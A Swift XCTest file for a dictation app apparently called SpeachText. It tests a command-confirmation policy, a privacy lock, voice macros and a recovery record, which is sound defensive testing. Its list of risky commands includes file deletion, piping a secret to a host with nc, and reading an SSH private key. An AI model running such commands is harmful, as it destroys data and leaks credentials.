@testable import SpeachText
import Foundation
import XCTest

final class SpeachTextFeatureTests: XCTestCase {
    func testCommandSafetyAllowsOnlyKnownLowRiskReadsWithoutConfirmation() {
        let home = URL(fileURLWithPath: "/Users/tester", isDirectory: true)

        XCTAssertFalse(CommandSafetyPolicy.requiresConfirmation(
            command: "pwd",
            workingDirectory: "/Users/tester",
            homeDirectory: home
        ))
        XCTAssertFalse(CommandSafetyPolicy.requiresConfirmation(
            command: "echo hello",
            workingDirectory: "/Users/tester/Documents",
            homeDirectory: home
        ))
    }

    func testCommandSafetyProtectsMutationNetworkShellControlAndExternalDirectories() {
        let home = URL(fileURLWithPath: "/Users/tester", isDirectory: true)
        let riskyCommands = [
            "rm -rf Notes",
            "curl https://example.com",
            "osascript -e 'tell application \"Finder\" to quit'",
            "echo secret | nc example.com 9000",
            "cat ~/.ssh/id_ed25519",
            "python3 script.py",
        ]

        for command in riskyCommands {
            XCTAssertTrue(
                CommandSafetyPolicy.requiresConfirmation(
                    command: command,
                    workingDirectory: "/Users/tester",
                    homeDirectory: home
                ),
                "Expected confirmation for: \(command)"
            )
        }

        XCTAssertTrue(CommandSafetyPolicy.requiresConfirmation(
            command: "pwd",
            workingDirectory: "/tmp",
            homeDirectory: home
        ))
    }

    func testPrivacyLockRecognizesBuiltInCustomAndSensitiveWindowContexts() {
        let builtIn = PrivacyLockPolicy.evaluate(
            appName: "1Password",
            bundleID: "com.1password.1password",
            windowTitle: "Vault",
            enabled: true,
            customBundleIDs: [],
            protectSensitiveWindows: true
        )
        XCTAssertTrue(builtIn.isLocked)
        XCTAssertEqual(builtIn.reason, .protectedApplication("1Password"))

        let custom = PrivacyLockPolicy.evaluate(
            appName: "Private Notes",
            bundleID: "com.example.secrets.helper",
            windowTitle: "Notes",
            enabled: true,
            customBundleIDs: ["com.example.secrets"],
            protectSensitiveWindows: true
        )
        XCTAssertTrue(custom.isLocked)
        XCTAssertEqual(custom.reason, .customApplication("com.example.secrets"))

        let privateWindow = PrivacyLockPolicy.evaluate(
            appName: "Safari",
            bundleID: "com.apple.Safari",
            windowTitle: "Private Browsing",
            enabled: true,
            customBundleIDs: [],
            protectSensitiveWindows: true
        )
        XCTAssertTrue(privateWindow.isLocked)
        XCTAssertEqual(privateWindow.reason, .sensitiveWindow("private browsing"))
    }

    func testPrivacyLockCanBeDisabledAndLeavesOrdinaryContextsUnlocked() {
        let disabled = PrivacyLockPolicy.evaluate(
            appName: "1Password",
            bundleID: "com.1password.1password",
            windowTitle: "Vault",
            enabled: false,
            customBundleIDs: [],
            protectSensitiveWindows: true
        )
        XCTAssertFalse(disabled.isLocked)
        XCTAssertEqual(disabled.reason, .disabled)

        let ordinary = PrivacyLockPolicy.evaluate(
            appName: "TextEdit",
            bundleID: "com.apple.TextEdit",
            windowTitle: "Untitled",
            enabled: true,
            customBundleIDs: [],
            protectSensitiveWindows: true
        )
        XCTAssertFalse(ordinary.isLocked)
        XCTAssertEqual(ordinary.reason, .notProtected)
    }

    func testVoiceMacrosRequireAnExactNormalizedPhraseAndOptionalPrefix() {
        let expected = VoiceMacro(
            id: UUID(uuidString: "966CA219-2898-453F-A7BD-053DB5E684A6")!,
            name: "Open Finder",
            triggerPhrase: "open finder",
            actionKind: .openApplication,
            payload: "com.apple.finder"
        )
        let macros = [expected]

        XCTAssertEqual(
            VoiceMacroMatcher.matchingMacro(
                for: "  Macro   Open Finder!  ",
                macros: macros,
                requirePrefix: true
            )?.id,
            expected.id
        )
        XCTAssertNil(VoiceMacroMatcher.matchingMacro(
            for: "open finder",
            macros: macros,
            requirePrefix: true
        ))
        XCTAssertNil(VoiceMacroMatcher.matchingMacro(
            for: "macro please open finder",
            macros: macros,
            requirePrefix: true
        ))
        XCTAssertEqual(
            VoiceMacroMatcher.matchingMacro(
                for: "OPEN FINDER.",
                macros: macros,
                requirePrefix: false
            )?.id,
            expected.id
        )
    }

    func testVoiceMacrosIgnoreDisabledAndEmptyTriggers() {
        let disabled = VoiceMacro(
            name: "Disabled",
            triggerPhrase: "open calendar",
            actionKind: .openApplication,
            payload: "com.apple.iCal",
            isEnabled: false
        )
        let empty = VoiceMacro(
            name: "Empty",
            triggerPhrase: "",
            actionKind: .insertText,
            payload: "ignored"
        )

        XCTAssertNil(VoiceMacroMatcher.matchingMacro(
            for: "macro open calendar",
            macros: [disabled, empty],
            requirePrefix: true
        ))
    }

    func testRecoveryVaultRecordRoundTripsWithoutLosingDestinationOrUndoState() throws {
        let record = RecoveryVaultRecord(
            id: UUID(uuidString: "3E69F005-2FE7-42EC-9098-4421715D8EBE")!,
            createdAt: Date(timeIntervalSince1970: 1_700_000_000),
            text: "Recovered text",
            appName: "TextEdit",
            bundleID: "com.apple.TextEdit",
            targetPID: 1234,
            source: .dictation,
            undoneAt: Date(timeIntervalSince1970: 1_700_000_100)
        )

        let encoded = try JSONEncoder().encode(record)
        let decoded = try JSONDecoder().decode(RecoveryVaultRecord.self, from: encoded)
        XCTAssertEqual(decoded, record)
    }
}
